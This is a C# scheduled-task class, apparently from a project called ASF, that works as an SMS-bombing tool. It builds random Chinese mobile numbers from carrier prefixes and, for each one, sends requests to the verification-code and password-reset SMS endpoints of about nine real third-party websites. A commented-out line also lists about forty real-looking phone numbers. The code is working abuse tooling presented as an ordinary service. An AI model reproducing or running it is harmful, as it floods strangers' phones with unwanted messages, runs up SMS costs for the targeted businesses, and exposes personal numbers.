using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Coravel.Invocable;
using IdGen;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

namespace ASF.Domain.Services
{
  /// <summary>
  /// 定时发送短信任务
  /// </summary>
  public class RunSendPhoneTasks : IInvocable
  {
    private readonly ILogger<RunSendPhoneTasks> _logger;
    /// <summary>
    /// 定时发送短信任务
    /// </summary>
    public RunSendPhoneTasks(ILogger<RunSendPhoneTasks> logger)
    {
      _logger = logger;
    }
    /// <summary>
    /// 激活定时任务
    /// </summary>
    /// <returns></returns>
    public async Task Invoke()
    {
      var generatorId = new Random().Next(0, 1023);
      // Let's say we take april 1st 2015 as our epoch
      var epoch = new DateTime(2020, 4, 1, 0, 0, 0, DateTimeKind.Utc);
      // Create a mask configuration of 45 bits for timestamp, 2 for generator-id 
      // and 16 for sequence
      var mc = new IdStructure(41, 10, 12);
      // Create an IdGenerator with it's generator-id set to 0, our custom epoch 
      // and mask configuration
      IdGeneratorOptions options = new IdGeneratorOptions(mc, new DefaultTimeSource(epoch));
      var generator = new IdGenerator(generatorId, options);
      // 克徕帝
      string sendUrl2 = "https://newapplet.crd.cn/Api/Member/Member/SendNewMobileCode?mobile={0}&source=MP-WEIXIN&openid=oTZkE5KTYsIlSTh1gKZ223jeovfI";
      // lihang 
      string senLingHang = "https://study.mshengedu.com/study/sys/validCode/getCode";
      // 展通安全
      string sendZtUrl = "https://tnwgh.hnztaqkj.com/Home/SendSmsForResetPwd";
      // 边度
      string bianUrl = "https://webflow.com/api/v1/form/600e922d01379c501fe4eeb5";
      // 聚来客
      string jlkUrl = "https://mainsys.jlksaas.com/sys/PhoneMsgCodeVal";
      // 上海 body365
      string sendUrl = "https://www.body365.cn/Home/SendSMSCode";
      string sendUrlHd = "https://bookinglogin.hart-worldwide.com:9002/driver/loginSms?format=json";
      //随机的手机号码
      string[] phoneList = new string[]
      {
        "130", "131", "132", "133", "134", "135", "136", "137", "138", "139", "151", "152", "153", "153", "154", "155",
        "156", "157", "158", "159","181","182","183","184","185","186","187","188","189"
      };
      for (int i = 0; i < phoneList.Length; i++)
      {
        long genid = generator.CreateId();
        string[] phone = new[] { genid.ToString().Substring(0, 8), genid.ToString().Substring(8, 8) };
        for (int j = 0; j < phone.Length; j++)
        {
          string data = phoneList[i] + phone[j];
          using (var http = new HttpClient())
          {
            string urlFormat = string.Format(sendUrl2, data);
            //短信发送1
            HttpResponseMessage response3 = await http.GetAsync(new Uri(urlFormat));
            if (response3.IsSuccessStatusCode)
            {
              string t = await response3.Content.ReadAsStringAsync();
              _logger.LogInformation(t);
            }
          }
          using (var http = new HttpClient())
          {
            //短信发送1
            HttpResponseMessage response3 = await http.GetAsync(new Uri($"https://rent.kilo-coin.com/renting/app/smscode/wxRentLogin/{data}"));
            if (response3.IsSuccessStatusCode)
            {
              string t = await response3.Content.ReadAsStringAsync();
              _logger.LogInformation(t);
            }
          }
          using (var http = new HttpClient())
          {
            //短信发送2
            StringContent httpContent1 = new StringContent(
              JsonConvert.SerializeObject(new { phone = data, validType = "Dt", tenantId = "" }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage response5 = await http.PostAsync(new Uri(senLingHang), httpContent1);
            if (response5.IsSuccessStatusCode)
            {
              string t = await response5.Content.ReadAsStringAsync();
              _logger.LogInformation(t);
            }
          }

          using (var http = new HttpClient())
          {
            Dictionary<string, string> dic = new Dictionary<string, string>()
            {
              ["name"] = "Contact-Inquiry-Bindolabs com",
              ["source"] = "https://bindolabs.com/",
              ["test"] = "true",
              ["fields[Name]"] = "GUST",
              ["fields[Email]"] = "gust@gaml.com",
              ["fields[phone]"] = data,
              ["fields[Business name]"] = "Stupid stuff",
              ["dolphin"] = "false"
            };
            FormUrlEncodedContent httpContent = new FormUrlEncodedContent(dic);
            var res = await http.PostAsync(new Uri(bianUrl), httpContent);
            if (res.IsSuccessStatusCode)
            {
              string t = await res.Content.ReadAsStringAsync();
              _logger.LogInformation(t);
            }
          }
          // string[] testPhone = new string[]{"13937769467","18737769695","13883140567","15137770487","13637799238","13915432908","15137808611","13525928345","13637811497","13937769467","18737769695","13883140567","18737877621","13937769467","18737769695","13883140567","18737877621","15837880222","15638029030","18638065564","13338130380","13838130691","13623996354","18338139606","13838186236","15138191072","13838193711","15238198777","15238238231","18838239680","15938312688","15938313868","13938314694","18638319669","13638320892","15638352015","18338356216","15139811102","15138387155","15138390130","18738392262"};

          using (var http = new HttpClient())
          {
            // 展通安全
            FormUrlEncodedContent ztHttpContent = new FormUrlEncodedContent(new Dictionary<string, string>()
            {
              ["loginName"] = data,
              ["minutes"] = "1"
            });
            HttpResponseMessage ztResponse = await http.PostAsync(new Uri(sendZtUrl), ztHttpContent);
            if (ztResponse.IsSuccessStatusCode)
            {
              string t = await ztResponse.Content.ReadAsStringAsync();
              if (!t.Contains("400"))
              {
                _logger.LogInformation($"展通安全成功{t}");
              }
            }
          }


          using (var http = new HttpClient())
          {
            // 聚来客
            StringContent httpContent1 = new StringContent(
              JsonConvert.SerializeObject(new { mobile = data, type = 1 }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage ztResponse = await http.PostAsync(new Uri(jlkUrl), httpContent1);
            if (ztResponse.IsSuccessStatusCode)
            {
              string t = await ztResponse.Content.ReadAsStringAsync();
            
              if (!t.Contains("\"State\":3"))
              {
                _logger.LogInformation($"聚来客{t}{data}");
              }
            }
          }
          // body365 
          using (var http = new HttpClient())
          {
            StringContent httpContent1 = new StringContent(
              JsonConvert.SerializeObject(new { val1 = data, val3 = "register" }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage ztResponse = await http.PostAsync(new Uri(sendUrl), httpContent1);
            if (ztResponse.IsSuccessStatusCode)
            {
              string t = await ztResponse.Content.ReadAsStringAsync();
              _logger.LogInformation($"body365{t}");
            }
          }
          //赫德物流
          using (var http = new HttpClient())
          {
            StringContent httpContent1 = new StringContent(
              JsonConvert.SerializeObject(new { PhoneNumber = data }),
              Encoding.UTF8, "application/json");
            HttpResponseMessage ztResponse = await http.PostAsync(new Uri(sendUrlHd), httpContent1);
            if (ztResponse.IsSuccessStatusCode)
            {
              string t = await ztResponse.Content.ReadAsStringAsync();
              if (!t.Contains("905"))
              {
                _logger.LogInformation($"赫德物流{t}");
              }
            }
          }
        }
      }
    }
  }
}